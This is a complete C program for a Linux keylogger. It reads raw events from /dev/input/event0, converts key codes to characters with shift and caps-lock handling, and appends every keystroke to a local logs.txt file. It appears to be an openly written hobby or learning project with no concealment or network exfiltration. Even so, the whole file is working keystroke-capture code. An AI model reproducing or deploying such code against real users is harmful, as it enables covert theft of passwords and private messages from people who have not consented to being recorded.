#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<linux/input.h>
#include<string.h>
#include<fcntl.h>
#include<sys/ioctl.h>
#include<ctype.h>
#include<stdbool.h>
#define KEY_RELEASE 0
#define KEY_IS_PRESSED 1
#define KEY_KEEPING_PRESSED 2

#include "parse.h"

/* 
 * Convert input stream key code to printable character and save to log file 
 */
static void print_code(int code, bool uppercase) {
	struct parse_event *p;
	for (p = key_events; p->name != NULL; p++) {
		if (p->value == (unsigned) code) {
			char keycopy[40];
			bool specialCase = true;	
			// Handle special cases (spaces, enter, etc)		
			switch(p->value) {
				case 12:
				case 74:
					 strcpy(keycopy, "-");
					 break;
				case 13:
				case 117:
					 strcpy(keycopy, "=");
					 break;
				case 26:
					 strcpy(keycopy, "[");
					 break;
				case 27:
					 strcpy(keycopy, "]");
					 break;
				case 28: strcpy(keycopy, "\n");
					 break;
				case 39:
					 strcpy(keycopy, ";");
					 break;
				case 40:
					 strcpy(keycopy, "'");
					 break;
				case 41:
					 strcpy(keycopy, "`");
					 break;
				case 42:
				case 54: 
					 return;
				case 43:
					 strcpy(keycopy, "\\");
					 break;
				case 51:
					 strcpy(keycopy, ",");
					 break;
				case 52: 
				case 83:
					 strcpy(keycopy, ".");
					 break;
				case 53:
				case 98:
					 strcpy(keycopy, "/");
					 break;
				case 57: 
				case 96:
					 strcpy(keycopy, " ");
					 break;
        case 2:
        case 3:
        case 4:
        case 5:
        case 6:
        case 7:
        case 8:
        case 9:
        case 10:
        case 11:
            strncpy(keycopy, &p->name[4], 40); // Chops off 'KEY_'
            break;
				default:
					 strncpy(keycopy, &p->name[4], 40); // Chops off 'KEY_'
					 specialCase = false;
			}	

      if (uppercase && specialCase) {
        switch(p->value) {
          case 2:
            strcpy(keycopy, "!");
            break;
          case 3:
            strcpy(keycopy, "@");
            break;
          case 4:
            strcpy(keycopy, "#");
            break;
          case 5:
            strcpy(keycopy, "$");
            break;
          case 6:
            strcpy(keycopy, "%");
            break;
          case 7:
            strcpy(keycopy, "^");
            break;
          case 8:
            strcpy(keycopy, "&");
            break;
          case 9:
            strcpy(keycopy, "*");
            break;
          case 10:
            strcpy(keycopy, "(");
            break;
          case 11:
            strcpy(keycopy, ")");
            break;
          case 12:
          case 74:
            strcpy(keycopy, "_");
            break;
          case 13:
          case 117:
            strcpy(keycopy, "+");
            break;
          case 26:
            strcpy(keycopy, "{");
            break;
          case 27:
            strcpy(keycopy, "}");
            break;
          case 39:
            strcpy(keycopy, ":");
            break;
          case 40:
            strcpy(keycopy, "\"");
            break;
          case 41:
            strcpy(keycopy, "~");
            break;
          case 43:
            strcpy(keycopy, "|");
            break;
          case 51:
            strcpy(keycopy, "<");
            break;
          case 52: 
          case 83:
            strcpy(keycopy, ">");
            break;
          case 53:
          case 98:
            strcpy(keycopy, "?");
            break;
        }
      }

			// Convert to lowercase if needed
			if (!uppercase && !specialCase) {
				for (int i = 0; keycopy[i]!='\0'; i++) {
					keycopy[i] = keycopy[i] + 32;
				}
			}

			printf("%s\n", keycopy);	
			
			// Open log file
			FILE *fp;
			fp = fopen("logs.txt", "a");
	
			if(fp == NULL) {
				exit(1);
			}

			// Save key to file
			fprintf(fp, "%s", keycopy);
			fclose(fp); // Close file
			
			return;
		}
	}
}

int main(int argc, char *argv[]) {

  	// Open keyboard file input stream
	char* keyboard = "/dev/input/event0"; // Todo: Handle /dev/input/eventX dynamically
	
	FILE* f = fopen(keyboard, "r");
	if (f == NULL) {
		perror("Keyboard input device not found");
		exit(1);
	}

	int fd;
	struct input_event evt[64]; // Keyboard input event, defined: https://www.kernel.org/doc/Documentation/input/input.txt

  	// Read in keyboard input
	if (( fd = open(keyboard, O_RDONLY)) < 0) {
		perror("Cannot read keyboard device input");
		return 1;
	}

	bool uppercase = false; // determine if input is upper or lowercase
	bool shiftHeld = false; // determine if shiftkey is being held
 	// Create a listener to the input stream
	while (1) {

    		// Read byte stream from input event
		size_t readbyte = read(fd, evt, sizeof(evt));

   		// Check for incorrect reads
		if (readbyte < (int) sizeof(struct input_event)) {
			perror("Input too short to read");
			return 1;
		}

    		// Loop over the input event per byte size
		for(int i = 0; i < (int) (readbyte / sizeof(struct input_event)); i++) {
			if (EV_KEY == evt[i].type) {
        
				// Never print capslock or shift

				// Add a check to see if KEY_IS_PRESSED or KEY_KEEPING_PRESSED and key = SHIFT_KEY (probably need to check for left and right). 
				// Set a boolean variable for shift key to true
				// Set a boolean variable for caplocks key to true if it is pressed
				// XOR the value of capslock and shift to determine upper or lowercase
		
				// Essentially skips the events fired before and after a key press
        			// this way only the pressed key value is shown
				
				// Handle shift key event
				if ( (evt[i].code == KEY_RIGHTSHIFT || evt[i].code == KEY_LEFTSHIFT)) {
					if(!shiftHeld){
						shiftHeld = true;
						uppercase = !uppercase;
						printf("You are holding shift: %s \n", uppercase ? "true" : "false");
					}
				} else {
					shiftHeld = false;
				}	

				if ((evt[i].value == KEY_IS_PRESSED) || (evt[i].value == KEY_KEEPING_PRESSED)) {
					//print_code(evt[i].code, uppercase);
					
					if(evt[i].code == KEY_CAPSLOCK) {
						uppercase = !uppercase;
						printf("You hit capslock: %s \n", uppercase ? "true" : "false");
					} else {
						print_code(evt[i].code, uppercase);
					}
				}
			}
		}
	}
	return 0;
}
